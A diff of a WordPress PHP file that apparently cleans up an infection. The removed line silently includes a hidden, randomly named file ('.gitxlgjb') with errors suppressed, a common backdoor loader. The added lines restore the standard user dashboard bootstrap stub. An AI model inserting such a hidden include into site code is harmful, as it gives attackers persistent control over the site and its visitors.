@@ -1,1 +1,13 @@
-<?php define("WP_USE_THEMES",true);@include_once(".gitxlgjb");require __DIR__."/wp-blog-header.php";?>
+<?php
+/**
+ * User Dashboard Administration Screen
+ *
+ * @package WordPress
+ * @subpackage Administration
+ * @since 3.1.0
+ */
+
+/** Load WordPress Administration Bootstrap */
+require_once __DIR__ . '/admin.php';
+
+require ABSPATH . 'wp-admin/index.php';
